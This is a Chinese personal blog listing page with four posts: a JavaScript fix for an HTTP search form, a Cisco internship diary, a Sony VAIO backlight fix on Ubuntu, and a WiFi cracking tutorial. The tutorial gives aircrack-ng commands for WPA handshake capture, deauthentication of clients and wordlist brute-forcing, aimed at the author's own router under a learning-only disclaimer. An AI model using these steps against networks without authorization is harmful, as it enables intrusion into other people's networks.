@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>土豆不好吃</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="土豆不好吃">
+<meta property="og:url" content="http://example.com/page/12/index.html">
+<meta property="og:site_name" content="土豆不好吃">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Benny小土豆">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">土豆不好吃</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-say-no-to-http-form/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/08/16/say-no-to-http-form/index/" class="article-date">
+  <time class="dt-published" datetime="2017-08-16T00:00:00.000Z" itemprop="datePublished">2017-08-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/website/">website</a>►<a class="article-category-link" href="/categories/website/program/">program</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/08/16/say-no-to-http-form/index/">找回小锁头，对HTTP表单说No</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>话说， 本博客上面有个”美剧电影“的栏目，其中有个带有HTTP的、人人影视的form表单，所以，俺的小锁头就没了。 原来的HTML代码大概是这样子的（这HTML代码写转义真是累啊……）：</p>
+<form action="http://www.zimuzu.tv/search/index?keyword=" method="get" name="search" target="\_blank">
+<input class="keywords" name="keyword" type="text" value="" />
+<input class="submit" type="submit" value="搜索" />
+</form>
+
+<p>好吧，其实俺忍了很久了，那该怎么把小锁头找回来呢？先说说我的思路</p>
+<h2 id="强行把HTTP改成HTTPS"><a href="#强行把HTTP改成HTTPS" class="headerlink" title="强行把HTTP改成HTTPS"></a>强行把HTTP改成HTTPS</h2><p>这不是我的可控范围之内，非常可怜的是，字幕组不带HTTPS，此路不通。</p>
+<h2 id="用PHP获取到输入内容，然后处理"><a href="#用PHP获取到输入内容，然后处理" class="headerlink" title="用PHP获取到输入内容，然后处理"></a>用PHP获取到输入内容，然后处理</h2><p>用超全局变量<code>_GET</code>或者<code>_POST</code>获取到用户输入的内容，然后再跳转到对应的页面。思路是这么个思路，但是不太现实啊！提交的内容还得给某个PHP文件处理，太不经济划算了！ [v_tips]嗯……多亏了维护那款<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2">Typecho主题</a>，我对PHP的掌控还是可以的……[&#x2F;v_tips]</p>
+<h2 id="短网址缩短服务"><a href="#短网址缩短服务" class="headerlink" title="短网址缩短服务"></a>短网址缩短服务</h2><p>咱这是GET方法，要不试试短链接服务？是这么个道理，可是找一圈，我也没发现几个好用的支持HTTPS的、速度不错的、切实可行的短链接服务，就差自己搭建一个了……</p>
+<h2 id="用JavaScript吧"><a href="#用JavaScript吧" class="headerlink" title="用JavaScript吧"></a>用JavaScript吧</h2><p>没错，事到如今，只好用起JavaScript了，通过<code>getElementById</code>和<code>value</code>方法获取到用户输入的内容，通过<code>window.open</code>打开新的窗口，这样小锁头就回来了。</p>
+<blockquote>
+<p>Talk is cheap, show me the code!</p>
+</blockquote>
+<input id="txt1" size="12" type="text" />
+<input type="button" value="搜索" onclick='window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById("txt1").value,"\_blank");'/>
+
+<p>如果觉得这样看起来比较费事的话，也可以写成函数的形式：</p>
+<input id="txt1" size="12" type="text" />
+<input type="button" value="搜索" onclick="search()"/>
+<script>
+function search(){
+window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById("txt1").value,"\_blank");
+}
+</script>
+
+<p>完美！！</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/2017081613574416.png"><img src="/images/2017081613574416.png"></a></p>
+<p>初学JavaScript，还望多多指教！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/08/16/say-no-to-http-form/index/" data-id="clhp6he1p0077ezqrc1l07ioi" data-title="找回小锁头，对HTTP表单说No" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-internship/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/08/11/internship/index/" class="article-date">
+  <time class="dt-published" datetime="2017-08-11T00:00:00.000Z" itemprop="datePublished">2017-08-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/08/11/internship/index/">在Cisco实习的经历</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>好吧，这是俺第一篇连续五天写出来的博文（面试什么的是俺的回忆啦）。</p>
+<h2 id="实习生申请"><a href="#实习生申请" class="headerlink" title="实习生申请"></a>实习生申请</h2><p>本来吧，在今年春季学期开学的时候，我是打算投另一个很有名的Y公司的，可以说得上是<strong>孤注一掷</strong>吧；后来偶然听说Cisco也来招聘实习生，于是我就去申请了。在五月末六月初，经过投递简历、宣讲会、笔试和面试，终于得到了offer，那时候也恰好是得知自己通过专八的时候，于是大学的俩梦想就这样完美了。嘿嘿，可是第三个梦想呢，遥遥无期，毫无希望，<strong>也许就是这样吧</strong>。</p>
+<p>后来看到邮件，果然没有通过Y公司的简历筛选，你丫丫，我很认真的投递简历的哎，反正……据说Y公司在我这也不是这家公司的正统业务，也正好吧。</p>
+<p>据统计，Cisco总计收到了简历700多封，其中大概有300人通过笔试进入面试，最后在面试中成功获得offer的有60人左右，俺还是蛮幸运的吧，哈哈。</p>
+<p>说说俺对这家公司的印象或者说是感觉？其实俺因为某些原因一直对这公司有一点点不先入为主的、太好的印象的，具体是啥原因呢，俺不能说，说了就暴露了哈哈。</p>
+<h2 id="宣讲会与笔试"><a href="#宣讲会与笔试" class="headerlink" title="宣讲会与笔试"></a>宣讲会与笔试</h2><p>我一共参加了两场宣讲会，一场是我自己学校的，另一场是陪另一个因故无法参加此次宣讲会的小伙伴去别的学校参加的。不得不说，大公司就是不一样，足足讲了接近两个小时吧，介绍了Cisco的历史以及一些福利待遇什么的。</p>
+<p>宣讲会之后自然是进行笔试了，笔试试题的是彩印的，印刷质量很好，并且Cisco的HR反复强调不要在试题册上作答，因为他们要循环利用这个试题册（从页眉上也能看出来这套试题用了很多次了）。</p>
+<p>那笔试内容都有啥呢？</p>
+<p>好吧，咱得说，这试题基本上都是英文的，难度不是很大，题型很活跃涉及范围很广泛，其实也可以说是很逗的啦。具体内容就不太方便多说啦。</p>
+<p>Cisco不会以笔试题的成绩来卡分，就是说，不是只有某个特定分数（比如说60分）以上的人才有面试的机会，应该是要综合看简历的吧。</p>
+<h2 id="没有回答上问题的面试"><a href="#没有回答上问题的面试" class="headerlink" title="没有回答上问题的面试"></a>没有回答上问题的面试</h2><p>关注俺推特的小伙伴们可能知道俺面试都经历了啥。其实也没啥好说的，就是HR会看俺的简历，然后跟着简历问一些问题，态度超级和善有说有笑的；之后又进行了一次语言的面试，就是随意的聊聊天，不讨论技术问题。</p>
+<p>俺自我感觉吧，俺这个专八是白过了，英语说得一塌糊涂，哎，看来表达能力还需要提高啊，哎哎哎！</p>
+<h2 id="实习开始之前……"><a href="#实习开始之前……" class="headerlink" title="实习开始之前……"></a>实习开始之前……</h2><p>唔……好吧，自然是准备各种资料啊什么的，当然还有一个非常重要的、严肃的问题就是租房子。咦，这可要感谢俺姐、俺姐夫还有俺娘（小嘎：那我呢？哎你一边吃糖去哈J）。</p>
+<p>俺周末的时候在公司附近跑了两天，怎么说呢——好货不便宜呗。最终俺还是花了实习补助的一大半租了一个比较如意的小房间吧。哎……</p>
+<p>之后俺就在想，也很纠结啊，得想办法赚点外快了，要不真的很难生活在这市中心啊。鉴于俺过了专八、有着不错的IT功底，给人翻译点东西、做做课设毕设啥的补贴下昂贵的房租和生活成本，应该还是可行的吧。不知道读者们（推友们）有何更好的建议？俺很想知道，俺想要多赚点钱啊。</p>
+<p>很快，自己的生活就要开始了，需要自己打理好一切，而这和学校无忧无虑的生活是不一样的！</p>
+<h1 id="Orientation"><a href="#Orientation" class="headerlink" title="Orientation!!!"></a>Orientation!!!</h1><h2 id="实习生-Day-1"><a href="#实习生-Day-1" class="headerlink" title="实习生 Day 1"></a>实习生 Day 1</h2><p>以前在上课的时候，俺总是早上第一个到的人，实习生活第一天竟然六点半就醒了。起来洗漱收拾，准备好材料到公司发现早就有人到了。</p>
+<p>HR姐姐带我们去了会议室，这个会议室叫啥呢，俺不能说，说了就又暴露了，哎写个文章也不容易。但是俺知道这个会议室名字的时候是一脸吃惊的(⊙ˍ⊙)</p>
+<p>之后HR姐姐为我们发放了badge（就是员工身份牌），还有check list，桌面上也放着一份这一周的schedule。</p>
+<p>在check list上写着员工的编号，右侧还告诉俺们怎么连Wi-Fi。要知道在学校，我可是我那一层楼<strong>第一个连接上校园网</strong>的人（我上学的时候入住的是新楼，那时候新楼的校园网还没有建设好），于是俺就争做第一人，用我的身份连接上了公司的Wi-Fi。公司自然是使用WPA2-Enterprise啦，也就是802.1x。</p>
+<p>连上Wi-Fi的第一件事情是什么，打开ip.cn看看是哪个运营商，再用speedtest测速。得出的结果令我震惊：香港的IP、速度超过4000KB&#x2F;s。哦我的天，能直接翻墙？立刻打开推特，哇真的能啊！而且还能多点登录哦，再也不用担心莫名其妙的掉线、被踢什么的了。</p>
+<p>从那一刻起，我就已经下定决心要好好努力留在Cisco了，这环境简直爽歪歪啊！</p>
+<p>少年，人心是会变的！</p>
+<p><img src="/images/081117_0303_2.png"></p>
+<p>Speedtest测速</p>
+<p>中午的时候，Cisco提供了一个”welcome lunch”，还是很丰盛的（可以说是我近几天以来吃过的最丰盛的一顿饭吧），之后我和几个小伙伴去附近转了转，一些设施还是很齐全的。</p>
+<p>为了让我们互相认识，首先来了个自我介绍，哎，玩王者荣耀的人这么多？俺说的啥？<strong>俺喜欢写博客，也喜欢读博客</strong>呗，嘿嘿。然后HR叫我们准备一个名字为”3 facts”的游戏，这是个啥呢，就是写三个关于自己的事情，其中有一个是假的，让大家猜猜哪个是假的，2 facts and a lie嘛，哈哈。</p>
+<p>晚上的时候，Cisco开始发东西啦，发了一件T恤，一个质量很不错的电脑包，当然还有电脑啦。看着身边的小伙伴们一个一个拿着崭新的、带着包装盒的ThinkPad X1 Carbon，我那叫一个羡慕啊。轮到我的时候，竟然给我发了个旧的ThinkPad T440 :sad: ，貌似我这个职位（大概十几个人）都给的旧的？虽说吧，给俺发的是旧电脑，但是成色也是不错的，配置也很不错，就是那贴纸暴露了上一个主人一定是个<strong>可爱的萌妹子</strong>。当然啦，俺要重点说说X1，Cisco给发的是i7版的X1（貌似是顶配了），这个本超级轻，也很薄，真的和MacBook一样轻薄，而且显示效果很炫彩很鲜艳，有键盘背光，256G的固态还支持指纹，哇我真是一脸羡慕。</p>
+<p>俺这电脑配置其实也很牛，网卡都是双频，支持5G哦。</p>
+<p><img src="/images/081117_0303_3.png"></p>
+<p>这内网传文件，恐怕是要爽到爆啊</p>
+<p>很明显这电脑都是”特殊定制”的，需要输入我自己的身份认证信息才能用，之后就是一些配置啦，配置IM、视频会议系统和VPN啦。不要一提到VPN就想到翻墙，VPN的设计初衷是为了让员工们在家就能访问到企业内网而达到远程办公的目的的。当然啦，如果我在不能翻墙的地方用VPN连接到公司，那就应该能翻墙了。啊哦对，别想着跟俺借这个账号，俺是不会答应的！</p>
+<p>关于工作时间？基本上就是朝九晚五那样吧其实是不打卡，弹性工作时间，双休，还是<strong>很幸福</strong>的。了解我的小伙伴们可能知道，我本人<strong>非常讨厌996</strong>，内心也是拒绝加班的，因为我很”懒”啊，这也是我讨厌某些企业（比如说华为，可以说是跳梁小丑了）的原因之一。俺不是来<strong>出卖劳动力或者是充当廉价劳动力</strong>的，俺是来实现自我价值、努力求得共赢的。哎嘿嘿什么蛇和大象？</p>
+<p>晚上HR姐姐跟我们说，注册个Facebook？五个月之前我才删除Facebook账号啊，要不要这么悲剧？新注册的还被suspend了……</p>
+<p>哦对了，得说下，这里的session讲的PPT什么的全都是英文的，不用说电脑也是英文版的Windows 10，毕竟嘛……好吧，<strong>学好英语真的很重要啊</strong>，非常重要的啊，特别重要啊，<strong>英语不好真的特别吃亏的（哪怕读者们外语主修不是英语）</strong>……俺在半年前的<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">《除了技术》</a>里已经很强调这一点了。</p>
+<h2 id="实习生-Day-2"><a href="#实习生-Day-2" class="headerlink" title="实习生 Day 2"></a>实习生 Day 2</h2><p>Day 2的时候，也就是各种介绍什么的。当然了，有我最喜欢的3 Facts呀！这个过程还是很欢乐的，尽管我还是没能记下来几个名字。有些童鞋们真的是演技派，有些一眼就能看出来在说谎。要不要大家看看我的3 Facts？虽说还没有轮到我上台编瞎话。</p>
+<p><img src="/images/081117_0303_4.png"></p>
+<p>我的 3 facts</p>
+<p>读者们来猜猜？我想大部分人都会猜错哦。想要猜的小伙伴可以给我发<a target="_blank" rel="noopener" href="https://t.me/BennyThink">Telegram</a>、<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks">Twitter</a>私信或者邮件、本文评论，万一猜中有奖呢是不！</p>
+<p>后来我们需要做一个online courses and tests，自然要把电脑搬回家连VPN了┗|｀O′|┛ 嗷~~</p>
+<p>俺这个职位，还是要学习很多东西的（虽说大部分俺都稍有接触）比如说Linux啦，Python&#x2F;Java&#x2F;Shell啦，，数据库啦。太多就不方便说了</p>
+<p>啊呀对呢，在会议休息的时间，还有零食和饮料呢，(╹ڡ╹ )</p>
+<h2 id="实习生-Day-3"><a href="#实习生-Day-3" class="headerlink" title="实习生 Day 3"></a>实习生 Day 3</h2><p>第三天的时候，安全部门的前辈们来给我们介绍了一些信息安全的常识吧，比如说木马呀、钓鱼邮件呀， 一些注意事项比如说使用指定的电脑以及badge、网络使用条例（比如说不能用P2P下载啊什么的）、防止尾随等等保护公司知识产权和财产的措施与手段。</p>
+<p>俺们公司的文件，一共有四个等级，估计大部分公司都是这样的，对外公开的，机密的，还有更高等级更机密的两种。比如说我们这几天培训的资料、笔试题，就属于机密这个”第二机密”的。所以你看在这，我不能把check list、培训网页的截图等等信息分享出来。</p>
+<p>啊哟对了，今天轮到我上台做3 facts，为啥大家都在笑呢，是因为俺太滑稽了吗？好吧，<strong>俺编瞎话的能力还是很强的</strong>，每个fact都有很多人认为是假的。可是认为第一个是假的的童鞋们，要对俺有信心啊！俺博客……以后的某天，日均PV肯定会过500的啊！</p>
+<p>下午的时候，俺这个小部门的人去见了mentor，就是宣讲会的时候那个特特特帅的大哥哥！俺这个部门的人比较少，只有九个，因为可能是筛选了一些自学能力非常强的童鞋吧。从此以后俺们就是一家人了，请让俺在看会照片记一下大家的脸。我们大概也就谈了谈以后将要学习哪些语言和工具，咦，看来Python真的是世界上最好的语言了，欢迎PHP党来戳死俺。好吧，Python + Flask，俺相信友情链接和推友里一定有这方面的老鸟。还望多多关照、不吝赐教！</p>
+<h2 id="实习生-Day-4"><a href="#实习生-Day-4" class="headerlink" title="实习生 Day 4"></a>实习生 Day 4</h2><p>今早我们做了一个很好玩的小游戏，就是分成几组，每组都给一张纸，上面写着会唱歌、会跳舞、会剪辑视频、参加过某某比赛等内容，然后需要到其他组找到这样的人然后来签名。第一个完成的组就算赢了。咦，那些会跳舞会唱歌的孩子们自然……要证明他们没有说谎了哦！</p>
+<p>之后的一个环节是屏幕上显示出Cisco的六个价值观，比如说change the world，innovation，do the right thing等等，让我们自我选择，然后上台演讲说说自己对选择的这个价值观的一些理解吧。当然啦，俺非常喜欢Google的那句”Don’t be evil”，所以自然而然的选择了Do the right thing。可是可怕的事情来了，选择俺这个的，总计才有三个人。其实想一想，人少也是有好处的，这样每个人上台表现的时间就会多了（虽说好像有的时候不知道该说什么的时候，冷场确实蛮尴尬的）。</p>
+<p>其实回忆下，我在很多人面前演讲啊什么的次数并不是很多，还总是有那么点害怕和胆怯吧。</p>
+<p>所以，对于这个话题，俺都说了些啥？俺自然是从”不作恶”出发，说了些怎么才算”不作恶”，对待极权政府的不合理审查应该怎样面对。顺便说了下我曾经的博文里说过的内容，比如说<a target="_blank" rel="noopener" href="https://dmesg.app/net-neutrality.html">net neutrality</a>啊什么的。</p>
+<blockquote>
+<p>Speak not because it is safe, but because it is right.</p>
+</blockquote>
+<h2 id="实习生-Day-5"><a href="#实习生-Day-5" class="headerlink" title="实习生 Day 5"></a>实习生 Day 5</h2><p>Day 5话，其实没什么事情，就是去完成check list，下午去了趟“Giving back”做志愿者，晚上和大家一起TB。TB是个啥呢？当然不是淘宝了，就是“Team Building”，俺也不知道咋翻译，简单理解就是聚餐吧。终于在和吃饭的时候认识全了我这个部门的9个人，又认识了一个漂亮的学姐，哈哈，好开心！</p>
+<p>于是，orientation就算是结束了，终于迎来了周末；下周，学习生活算是真正开始了吧……嗯哼。</p>
+<h2 id="最后的一些感想"><a href="#最后的一些感想" class="headerlink" title="最后的一些感想"></a>最后的一些感想</h2><p>或者说是感悟吧，嗯哼？</p>
+<p>就是俺觉得，Cisco真的挺不错的；办公环境很好，员工的福利也很多（尽管俺是实习生），前辈们也很有耐心，很多原因吧。至少俺要留在Cisco。</p>
+<p>哦对了，小计划的一颗种子已经埋下来了呢。尽管可能没人在乎，<strong>似乎本身就应该没人在乎啊</strong>。但是那晚谈话的<strong>每一句话真真切切的是认真的呢</strong>。虽说我依旧在孤注一掷（孤注一掷似乎成为了我最大的缺陷，明知道结果却还<strong>那么傻</strong>），但是，谁知道呢，谁在乎呢。哈哈，文风瞬间转成”I don’t give a shit”，好吧(；′⌒`)</p>
+<p>当然，俺得努力，”虽说title是实习生，但是要把自己当作正式员工看待”，很没底气的说，俺终于可以努力去当第一名了，毕竟这是俺从小以来的爱好，毕竟这是俺喜欢的东西，毕竟俺叫小土豆（这个，育碧的土豆不好吃也不能吃，容易中毒。<strong>珍爱生命远离毒……土豆</strong>）。</p>
+<p>俺经常说Remember me，亲爱的你，你说是不是？</p>
+<p>人生啊，总是会发生变动的。总有一天我也会离开Cisco，那么我是会开心还是会后悔呢。我不知道，至少现在还不知道。也许到那天，我会再写一篇来说说这件事情吧。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/08/11/internship/index/" data-id="clhp6he08003rezqrbjqpemjr" data-title="在Cisco实习的经历" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ubuntu-kbd/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/08/03/ubuntu-kbd/index/" class="article-date">
+  <time class="dt-published" datetime="2017-08-03T00:00:00.000Z" itemprop="datePublished">2017-08-03</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/it/">it</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/08/03/ubuntu-kbd/index/">Ubuntu下SONY VAIO SVF15217SCW 键盘背光问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>刚刚发现一个很奇怪的问题，笔记本键盘背光在Ubuntu竟然是不亮的。好吧，再准确些，POST和GRUB的时候是亮的，启动到Ubuntu的过程中就自己不亮了。而这货的默认设置是按任意键键盘灯亮，15秒之后熄灭。经过一番搜索，在askubuntu上发现这似乎是一个比较难搞的bug……还好，俺解决了。 <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/2017080314291748.png"><img src="/images/2017080314291748.png"></a> 只要打开终端执行这两条命令，键盘灯就应该亮了</p>
+<p>sudo modprobe -r sony_laptop<br>sudo modprobe -v sony_laptop kbd_backlight&#x3D;1</p>
+<p>自动化点该怎么办？alias下，<code>sudo NOPASSWD</code>放到<code>/etc/rc.local</code></p>
+<h2 id="查看电脑具体型号"><a href="#查看电脑具体型号" class="headerlink" title="查看电脑具体型号"></a>查看电脑具体型号</h2><p>sudo dmidecode -s system-product-name</p>
+<h2 id="查看模块信息"><a href="#查看模块信息" class="headerlink" title="查看模块信息"></a>查看模块信息</h2><p>modinfo sony-laptop</p>
+<h2 id="关于背光的更多参数"><a href="#关于背光的更多参数" class="headerlink" title="关于背光的更多参数"></a>关于背光的更多参数</h2><p><code>kbd_backlight</code>: 0 禁用背光；1 启动自动背光（定时熄灭）；2 常亮背光 <code>kbd_backlight_timeout</code>: 0-3代表不同的背光自动熄灭时间。</p>
+<p>不过好像小键盘就不能用了？？？</p>
+<p>参考资料</p>
+<p><a target="_blank" rel="noopener" href="https://askubuntu.com/questions/475711/turn-off-keyboard-back-light-sony-vaio-svf1521dcxw">https://askubuntu.com/questions/475711/turn-off-keyboard-back-light-sony-vaio-svf1521dcxw</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/08/03/ubuntu-kbd/index/" data-id="clhp6he3600ajezqr9cvz8ou1" data-title="Ubuntu下SONY VAIO SVF15217SCW 键盘背光问题" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-wifi-cracking/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/07/26/wifi-cracking/index/" class="article-date">
+  <time class="dt-published" datetime="2017-07-26T00:00:00.000Z" itemprop="datePublished">2017-07-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/07/26/wifi-cracking/index/">小土豆手把手教你破WiFi</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>本文差不多是<a target="_blank" rel="noopener" href="https://github.com/brannondorsey/wifi-cracking">https://github.com/brannondorsey/wifi-cracking</a>的翻译以及一些遇到的坑。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家看啊，那WiFi可是电磁波啊，电磁波在空间里传播出来，那方向可是没人能控制的，所以是个无线网卡都能给接收下来……是不是有点像集线器网络下的”混杂模式啊”，只不过无线网卡并不需要加入到网络中就能”监听”呢。</p>
+<p>好吧，是加密的，但是，咱都是懒懒的，万一要是设置了123456789这样的弱口令，就比较容易抓到握手包然后暴力破解啦。</p>
+<p>就让小土豆俺来手把手教你破WiFi密码吧！</p>
+<p>[v_error]免责声明：本教程以及工具仅限于学习目的使用，请勿在未授权的网络环境中使用，本人概不负责。[&#x2F;v_error]</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>你需要一个装有Debian系的Linux发行版，Kali最好啦；</p>
+<p>你需要安装好aircrack-ng；</p>
+<p>sudo apt-get install aircrack-ng</p>
+<p>你需要有个支持监听模式的无线网卡，最好还是那种和aircrack兼容性比较好的网卡；</p>
+<p>最好再熟悉下Linux的操作</p>
+<h2 id="进入监听模式"><a href="#进入监听模式" class="headerlink" title="进入监听模式"></a>进入监听模式</h2><p>咱呐，最好选个兼容性比较高的无线网卡，别搞半天进不去监听模式就糟糕了。</p>
+<p>首先先看看有哪些无线网卡，我们可以看到无线网卡此时的工作模式是<code>managed</code></p>
+<p>iwconfig</p>
+<p>然后列出来哪些网卡是支持监听模式</p>
+<p>airmon-ng</p>
+<p><img src="/images/072617_0104_WiFi1.png"></p>
+<p>如果显示为空白，那么就是你的无线网卡不支持监听模式 :-(</p>
+<p>俺这里就用<code>wlan1</code>这个网卡啦(BCM43142实在是大坑)，为了避免干扰，我们先关了其他的使用网络的进程</p>
+<p>airmon-ng check kill</p>
+<p><img src="/images/072617_0104_WiFi2.png"></p>
+<p>进入监听模式</p>
+<p>airmon-ng start wlan1</p>
+<p>之后我们使用<code>iwconfig</code>来确定进入了监听模式，俺的设备的名字叫做<code>wlan1mon</code>，可以清楚看到<code>Mode: Monitor</code></p>
+<p><img src="/images/072617_0104_WiFi3.png"></p>
+<h2 id="搜寻目标"><a href="#搜寻目标" class="headerlink" title="搜寻目标"></a>搜寻目标</h2><p>airodump-ng wlan1mon</p>
+<p>咱大概能看到类似下面这样的输出，此次我们的目标是我的新路由器PDCN，我们需要记住BSSID和CH</p>
+<p><img src="/images/072617_0104_WiFi4.png"></p>
+<h2 id="抓4次握手包"><a href="#抓4次握手包" class="headerlink" title="抓4次握手包"></a>抓4次握手包</h2><p>airodump-ng -c 13 –bssid 20:76:93:00:41:DC -w test wlan1mon</p>
+<p>其中-c后面的参数代表信道（CH），–bssid是上面记下来的MAC地址，-w后面代表输出文件的名字，我们这里就叫test了。</p>
+<p><img src="/images/072617_0104_WiFi5.png"></p>
+<p>现在我们只需要等待了，只要有设备连接到WiFi，我们就很有可能抓到握手包，此时右上角大概会显示<code>WPA handshake</code> 什么什么的，如下图所示</p>
+<p><img src="/images/072617_0104_WiFi6.png"></p>
+<p>这个……万一一直没人连咋办？咱可以想办法让已连接的设备断开连接，之后这个设备肯定会自动连接的，这个时候抓到握手包就可以啦</p>
+<h3 id="Deauth加快抓握手包"><a href="#Deauth加快抓握手包" class="headerlink" title="Deauth加快抓握手包"></a>Deauth加快抓握手包</h3><p>我们继续观察上面抓握手包的窗口，直到下面STATION出现一个已经连接的设备，这是必然会出现的，然后新开终端，输入如下命令：</p>
+<p>aireplay-ng -0 10 –a 20:76:93:00:41:DC -c 00::0C:E7:76:94:03 wlan1mon</p>
+<p>其中：-0 10代表我们要发送10次deauth包，-a 代表WiFi的MAC，-c代表客户的MAC</p>
+<p><img src="/images/072617_0104_WiFi7.png"></p>
+<p>当抓到握手包之后，就可以停止监听啦，按Ctrl + C停止airodump</p>
+<p>这个方法可能不好用……</p>
+<h2 id="恢复网络"><a href="#恢复网络" class="headerlink" title="恢复网络"></a>恢复网络</h2><p>airmon-ng stop wlan1mon<br>service network-manager start</p>
+<p>我们的握手包就叫<code>test.cap</code>啦。</p>
+<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><p>抓下来握手包之后，破解密码是个运气和耐心活，咱可以去一些在线网站尝试着破解，或者去淘宝跑。在线破解网站比如说<a target="_blank" rel="noopener" href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php">https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php</a>，<a target="_blank" rel="noopener" href="https://gpuhash.me/">https://gpuhash.me/</a></p>
+<p>咱这里选择本地破解啦，首先，需要有个比较好用的弱口令字典，这就要自己看咯；</p>
+<p>本地破解有很多工具，其一是使用hashcat，这家伙能利用GPU；我们也可以使用传统的aircrack</p>
+<h3 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h3><p>下载弱口令字典并破解握手包</p>
+<p>curl -L -o rockyou.txt <a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a><br>aircrack-ng -a2 -b 20:76:93:00:41:DC -w rockyou.txt test.cap</p>
+<p>-b代表bssid，-a2代表 WPA2，-w是字典，如果运气好的话……</p>
+<p><img src="/images/072617_0104_WiFi8.png"> 123456789就是WiFi密码</p>
